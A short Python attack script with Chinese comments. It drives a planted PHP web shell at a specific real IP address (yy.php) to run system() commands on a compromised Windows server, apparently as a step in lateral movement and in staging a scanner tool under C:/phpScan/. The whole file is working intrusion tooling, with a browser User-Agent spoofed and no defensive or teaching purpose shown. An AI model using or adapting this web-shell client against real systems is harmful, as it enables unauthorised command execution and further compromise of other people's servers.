#!/usr/bin/env python3
"""81.70 横向: 传PHP并发扫描器到C:/phpScan/ 并启动"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=60):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 1. 确认 php CLI 路径
r = cmd("system('dir /b C:/phpStudy/php 2>nul');", 20)
print("1. php版本目录:", r.strip()[-100:], flush=True)

# 2. 确认 C:/phpScan 存在
r = cmd("system('if exist C:/phpScan (echo YES) else (echo NO)');", 20)
print("2. C:/phpScan:", r.strip()[-20:], flush=True)
